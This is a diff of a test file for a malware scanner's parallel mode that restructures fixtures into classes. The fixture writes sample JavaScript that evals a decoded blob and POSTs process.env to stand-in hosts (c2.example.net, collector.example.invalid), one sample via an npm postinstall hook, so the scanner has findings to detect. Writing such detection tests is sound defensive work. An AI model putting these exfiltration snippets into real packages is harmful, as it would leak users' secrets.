@@ -22,7 +22,56 @@ from cordon_scanner.core.parallel import (
 )
 
 
-class TestWorkerCount:
+class ParallelFixtures:
+    """Fixtures for the tests in test_parallel.py; every test class here inherits them."""
+
+    @pytest.fixture
+    def repository(self, tmp_path):
+        """A tree large enough to cross the parallel threshold, and to be batched."""
+        root = tmp_path / "repo"
+        root.mkdir()
+        for i in range(FIXTURE_FILES):
+            (root / f"mod{i:04d}.js").write_text(
+                f"export const value{i} = {i};\nexport function f{i}(a) {{ return a + {i}; }}\n",
+                encoding="utf-8",
+            )
+        # A handful of real findings, so the comparison is not between two empty
+        # results.
+        (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n", encoding="utf-8")
+        (root / "telemetry.js").write_text(
+            "const { execSync } = require('child_process');\n"
+            "const e = JSON.stringify(process.env);\n"
+            "fetch('https://c2.example.net/i', {method:'POST', body:e});\n"
+            "execSync('true');\n",
+            encoding="utf-8",
+        )
+
+        # And one finding that exists ONLY because of the scan context, which is the
+        # case the equivalence tests above could not see.
+        #
+        # Every finding in this fixture used to stand on the contents of its own file.
+        # Those cross the process boundary intact, so the comparison passed while an
+        # entire class of detection was missing in parallel: `ctx.in_install_hook` is a
+        # precondition on the composites, the worker rebuilt the context from the
+        # inventory alone, and the inventory knows `package.json` declares a
+        # `postinstall` without knowing it runs `scripts/setup.js`. Same files, same
+        # count, same rules -- and MALWARE.EXFIL.001 at critical with one worker and
+        # nothing at all with eight.
+        (root / "package.json").write_text(
+            '{"name":"fixture","version":"1.0.0","scripts":{"postinstall":"node scripts/setup.js"}}\n',
+            encoding="utf-8",
+        )
+        (root / "scripts").mkdir()
+        (root / "scripts" / "setup.js").write_text(
+            "const https = require('https');\n"
+            "const body = JSON.stringify(process.env);\n"
+            "https.request({host:'collector.example.invalid',method:'POST'},()=>{}).end(body);\n",
+            encoding="utf-8",
+        )
+        return root
+
+
+class TestWorkerCount(ParallelFixtures):
     def test_small_scans_stay_serial(self) -> None:
         """Pool startup is tens of milliseconds per worker, which is most of the
         runtime on a few hundred files. A pre-commit hook must not pay it."""
@@ -45,7 +94,7 @@ class TestWorkerCount:
         assert 1 <= count <= MAX_WORKERS
 
 
-class TestBatching:
+class TestBatching(ParallelFixtures):
     def test_batches_are_balanced_by_bytes(self) -> None:
         """One large file and a thousand small ones are not the same work.
         Sizing by count leaves a worker holding the large file while the others
@@ -91,61 +140,19 @@ class TestBatching:
 FIXTURE_FILES = 1_100
 
 
-@pytest.fixture
-def repository(tmp_path):
-    """A tree large enough to cross the parallel threshold, and to be batched."""
-    root = tmp_path / "repo"
-    root.mkdir()
-    for i in range(FIXTURE_FILES):
-        (root / f"mod{i:04d}.js").write_text(
-            f"export const value{i} = {i};\nexport function f{i}(a) {{ return a + {i}; }}\n",
-            encoding="utf-8",
+class ParallelHelpers:
+    """Helpers for test_parallel.py."""
+
+    @staticmethod
+    def scan_with(repository, workers: int):
+        cfg = Config.default().with_overrides(
+            use_cache=False, limits=Config.default().limits.merged(max_workers=workers)
         )
-    # A handful of real findings, so the comparison is not between two empty
-    # results.
-    (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n", encoding="utf-8")
-    (root / "telemetry.js").write_text(
-        "const { execSync } = require('child_process');\n"
-        "const e = JSON.stringify(process.env);\n"
-        "fetch('https://c2.example.net/i', {method:'POST', body:e});\n"
-        "execSync('true');\n",
-        encoding="utf-8",
-    )
-
-    # And one finding that exists ONLY because of the scan context, which is the
-    # case the equivalence tests above could not see.
-    #
-    # Every finding in this fixture used to stand on the contents of its own file.
-    # Those cross the process boundary intact, so the comparison passed while an
-    # entire class of detection was missing in parallel: `ctx.in_install_hook` is a
-    # precondition on the composites, the worker rebuilt the context from the
-    # inventory alone, and the inventory knows `package.json` declares a
-    # `postinstall` without knowing it runs `scripts/setup.js`. Same files, same
-    # count, same rules -- and MALWARE.EXFIL.001 at critical with one worker and
-    # nothing at all with eight.
-    (root / "package.json").write_text(
-        '{"name":"fixture","version":"1.0.0","scripts":{"postinstall":"node scripts/setup.js"}}\n',
-        encoding="utf-8",
-    )
-    (root / "scripts").mkdir()
-    (root / "scripts" / "setup.js").write_text(
-        "const https = require('https');\n"
-        "const body = JSON.stringify(process.env);\n"
-        "https.request({host:'collector.example.invalid',method:'POST'},()=>{}).end(body);\n",
-        encoding="utf-8",
-    )
-    return root
-
-
-def scan_with(repository, workers: int):
-    cfg = Config.default().with_overrides(
-        use_cache=False, limits=Config.default().limits.merged(max_workers=workers)
-    )
-    return Scanner(cfg).scan(repository)
+        return Scanner(cfg).scan(repository)
 
 
 @pytest.mark.slow
-class TestParallelEquivalence:
+class TestParallelEquivalence(ParallelFixtures):
     def test_the_fixture_actually_parallelises(self) -> None:
         """The guard under every test in this class.
 
@@ -198,7 +205,7 @@ class TestParallelEquivalence:
 
 
 @pytest.mark.slow
-class TestTheContextReachesTheWorkers:
+class TestTheContextReachesTheWorkers(ParallelFixtures):
     """A worker rebuilt the scan context from the inventory and lost half of it.
 
     `engine._context(inventory)` can say that a manifest DECLARES an install hook.
@@ -223,7 +230,7 @@ class TestTheContextReachesTheWorkers:
     RULE = "MALWARE.EXFIL.001"
 
     def test_the_install_time_finding_survives_the_pool(self, repository) -> None:
-        parallel = scan_with(repository, 8)
+        parallel = ParallelHelpers.scan_with(repository, 8)
         hit = [
             f
             for f in parallel.findings
@@ -237,9 +244,11 @@ class TestTheContextReachesTheWorkers:
     def test_and_is_reported_identically_serially(self, repository) -> None:
         """The assertion that makes the one above mean something: if the fixture
         stopped producing this finding at all, that test would pass by vacuum."""
-        serial = scan_with(repository, 1)
+        serial = ParallelHelpers.scan_with(repository, 1)
         assert [f.fingerprint for f in serial.findings if f.rule_id == self.RULE] == [
-            f.fingerprint for f in scan_with(repository, 8).findings if f.rule_id == self.RULE
+            f.fingerprint
+            for f in ParallelHelpers.scan_with(repository, 8).findings
+            if f.rule_id == self.RULE
         ]
 
     def test_the_install_time_risk_factor_is_applied_either_way(self, repository) -> None:
@@ -249,7 +258,7 @@ class TestTheContextReachesTheWorkers:
         for workers in (1, 8):
             hit = next(
                 f
-                for f in scan_with(repository, workers).findings
+                for f in ParallelHelpers.scan_with(repository, workers).findings
                 if f.rule_id == self.RULE and f.location.path.endswith("scripts/setup.js")
             )
             factors[workers] = {factor.name for factor in hit.risk.factors}
@@ -277,7 +286,7 @@ class TestTheContextReachesTheWorkers:
         assert merged.in_install_hook("scripts/setup.js")
 
 
-class TestCompletionOrder:
+class TestCompletionOrder(ParallelFixtures):
     """Batches are consumed as they finish, not in submission order.
 
     Waiting on futures in order means one slow batch holds back every batch
